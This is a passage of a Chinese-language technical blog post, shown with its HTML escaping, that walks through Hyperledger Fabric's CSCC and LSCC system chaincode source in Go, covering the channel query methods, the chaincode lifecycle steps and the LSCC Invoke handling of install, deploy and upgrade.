		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;txsFilter&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
			&lt;span style=&#34;color:#75715e&#34;&gt;// add array of validation code hardcoded to valid
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;txsFilter&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;util&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NewTxValidationFlagsSetValue&lt;/span&gt;(len(&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Data&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_VALID&lt;/span&gt;)
			&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metadata&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metadata&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BlockMetadataIndex_TRANSACTIONS_FILTER&lt;/span&gt;] = &lt;span style=&#34;color:#a6e22e&#34;&gt;txsFilter&lt;/span&gt;
		}

		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;joinChain&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;cid&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;deployedCCInfoProvider&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;legacyLifecycle&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;newLifecycle&lt;/span&gt;)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;getconfigblock方法&#34;&gt;GetConfigBlock方法&lt;/h4&gt;
&lt;p&gt;这个方法用于获取给定通道的当前的配置区块。需要一个参数：通道名字的bytes形式。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetConfigBlock&lt;/span&gt;:
		&lt;span style=&#34;color:#75715e&#34;&gt;// 2. check policy
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;aclProvider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CheckACL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;resources&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Cscc_GetConfigBlock&lt;/span&gt;, string(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]), &lt;span style=&#34;color:#a6e22e&#34;&gt;sp&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;access denied for [%s][%s]: %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fname&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;))
		}
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getConfigBlock&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;getchannel方法&#34;&gt;GetChannel方法&lt;/h4&gt;
&lt;p&gt;这个方法用于获取peer节点目前所加入的通道。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetChannels&lt;/span&gt;:
		&lt;span style=&#34;color:#75715e&#34;&gt;// 2. check get channels policy
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;aclProvider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CheckACL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;resources&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Cscc_GetChannels&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;sp&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;access denied for [%s]: %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fname&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;))
		}

		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getChannels&lt;/span&gt;()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;生命周期系统链码-life-cycle-system-chaincode-lscc&#34;&gt;生命周期系统链码 (&lt;em&gt;Life Cycle System Chaincode&lt;/em&gt;, LSCC)&lt;/h3&gt;
&lt;p&gt;LSCC主要管理链码的生命周期，主要包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在peer节点上安装链码&lt;/li&gt;
&lt;li&gt;在通道上部署和升级链码&lt;/li&gt;
&lt;li&gt;用户从运行中的链码获取信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;链码的生命周期&#34;&gt;链码的生命周期&lt;/h4&gt;
&lt;p&gt;打包链码：&lt;/p&gt;
&lt;p&gt;在被安装到peer节点之前，链码需要被打包进一个&lt;code&gt;.tar.gz&lt;/code&gt;文件，其中包含两个文件：&amp;ldquo;metadata.json&amp;quot;和另一个包含链码文件的文件&amp;quot;code.tar.gz&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;metadata.json&amp;quot;包含了指定链码语言、代码路径、以及包标签的JSON文件。&lt;/p&gt;
&lt;p&gt;安装链码：&lt;/p&gt;
&lt;p&gt;每个要执行和背书交易的peer节点上都需要安装链码包。安装完成后，peer节点会构造链码。一般建议每个组织下的所有peer使用相同的链码包。&lt;/p&gt;
&lt;p&gt;批准链码定义：&lt;/p&gt;
&lt;p&gt;通过 &lt;strong&gt;链码定义&lt;/strong&gt; 来管理链码。当通道成员批准一个链码定义，这个批准便作为一个组织在接受链码参数方面的投票。这些同意的组织定义允许通道成员在链码可以在通道上使用之前达成一致意见（同意链码运行在此通道上）。&lt;/p&gt;
&lt;p&gt;链码定义包含以下参数（需要在组织之间保持一致）：&lt;strong&gt;名称&lt;/strong&gt;、&lt;strong&gt;版本&lt;/strong&gt;、&lt;strong&gt;序列号&lt;/strong&gt;、&lt;strong&gt;背书策略&lt;/strong&gt;、&lt;strong&gt;私有数据集合配置&lt;/strong&gt;、&lt;strong&gt;ECSS/VSCC插件&lt;/strong&gt;、&lt;strong&gt;初始化&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;提交链码定义到通道：&lt;/p&gt;
&lt;p&gt;足够多的成员同意一个链码定义后，某个组织能够提交定义到通道。提交交易首先发送给通道成员的peer节点，peer节点会查询链码定义的被同意状况，确认组织同意后为其背书，交易随后被提交到排序服务，排序服务会把链码定义提交给通道。&lt;/p&gt;
&lt;h4 id=&#34;源代码-1&#34;&gt;源代码&lt;/h4&gt;
&lt;p&gt;部署时的config&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lsccInst&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SCC&lt;/span&gt;{
	&lt;span style=&#34;color:#a6e22e&#34;&gt;BuiltinSCCs&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;builtinSCCs&lt;/span&gt;,
    &lt;span style=&#34;color:#75715e&#34;&gt;// type: FilesystemSupport
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// Support提供了一些静态函数的实现
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SupportImpl&lt;/span&gt;{
		&lt;span style=&#34;color:#a6e22e&#34;&gt;GetMSPIDs&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;peerInstance&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetMSPIDs&lt;/span&gt;,
	},
    &lt;span style=&#34;color:#75715e&#34;&gt;// type: sysccprovider.SystemChaincodeProvider
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// SCCProvider是用于访问系统其他部分的接口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;SCCProvider&lt;/span&gt;:        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PeerShim&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Peer&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;peerInstance&lt;/span&gt;},
    &lt;span style=&#34;color:#75715e&#34;&gt;// type: aclmgmt.ACLProvider
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// ACLProvider负责访问权限控制
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;ACLProvider&lt;/span&gt;:        &lt;span style=&#34;color:#a6e22e&#34;&gt;aclProvider&lt;/span&gt;, 
	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetMSPIDs&lt;/span&gt;:          &lt;span style=&#34;color:#a6e22e&#34;&gt;peerInstance&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetMSPIDs&lt;/span&gt;,
    &lt;span style=&#34;color:#75715e&#34;&gt;// type: policy.PolicyChecker
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// PolicyChecker是用于执行访问控制的接口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;PolicyChecker&lt;/span&gt;:      &lt;span style=&#34;color:#a6e22e&#34;&gt;policyChecker&lt;/span&gt;,
	&lt;span style=&#34;color:#a6e22e&#34;&gt;BCCSP&lt;/span&gt;:              &lt;span style=&#34;color:#a6e22e&#34;&gt;factory&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetDefault&lt;/span&gt;(),
	&lt;span style=&#34;color:#a6e22e&#34;&gt;BuildRegistry&lt;/span&gt;:      &lt;span style=&#34;color:#a6e22e&#34;&gt;buildRegistry&lt;/span&gt;,
	&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeBuilder&lt;/span&gt;:   &lt;span style=&#34;color:#a6e22e&#34;&gt;containerRouter&lt;/span&gt;,
	&lt;span style=&#34;color:#a6e22e&#34;&gt;EbMetadataProvider&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;ebMetadataProvider&lt;/span&gt;,
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;/core/scc/lscc/lscc.go&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;Invoke&lt;/code&gt;代码的形式与QSCC部分类似，都是使用switch语句选择所调用的方法（将函数名定义为常量）&lt;/p&gt;
&lt;p&gt;由于代码过长，以下代码省略异常处理部分：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;SCC&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Invoke&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeStubInterface&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetArgs&lt;/span&gt;()

	&lt;span style=&#34;color:#a6e22e&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; string(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;// 第一个参数是函数名
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;function&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;INSTALL&lt;/span&gt;:
		&lt;span style=&#34;color:#a6e22e&#34;&gt;depSpec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
		&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;executeInstall&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;depSpec&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 根据第二个参数 deployment spec 安装链码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Success&lt;/span&gt;([]byte(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OK&amp;#34;&lt;/span&gt;))
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DEPLOY&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;UPGRADE&lt;/span&gt;:
		&lt;span style=&#34;color:#75715e&#34;&gt;// 至少有三个参数： 函数名，链码名和deployment spec
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
		&lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; string(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
        
		&lt;span style=&#34;color:#a6e22e&#34;&gt;ac&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;exists&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SCCProvider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetApplicationConfig&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 通过第二个参数获取配置
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
		&lt;span style=&#34;color:#a6e22e&#34;&gt;depSpec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
		&lt;span style=&#34;color:#a6e22e&#34;&gt;cds&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeDeploymentSpec&lt;/span&gt;{}

		&lt;span style=&#34;color:#75715e&#34;&gt;// 可选参数：
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// 第四个参数是 已编组的 SignaturePolicyEnvelope 代表了背书政策
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// 第五个参数是 escc名
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// 第六个参数是 vscc名
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// 第七个参数是 一个已编组的 CollectionConfigPackage 类
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		
		&lt;span style=&#34;color:#75715e&#34;&gt;// 第四个参数：
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;EP&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;EP&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#75715e&#34;&gt;// EP为一个背书政策
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;mspIDs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetMSPIDs&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt;)
			&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;policydsl&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SignedByAnyMember&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;mspIDs&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 根据通道的mspID获取背书政策？
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;EP&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Marshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 将结果进行编组
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		}

        &lt;span style=&#34;color:#75715e&#34;&gt;// 第五个参数：
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;escc&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;escc&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]
		} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;escc&lt;/span&gt; = []byte(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;escc&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 默认为escc
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		}

        &lt;span style=&#34;color:#75715e&#34;&gt;// 第六个参数：
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]
		} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt; = []byte(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;vscc&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 默认为vscc
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		}

        &lt;span style=&#34;color:#75715e&#34;&gt;// 如果有第七个参数：
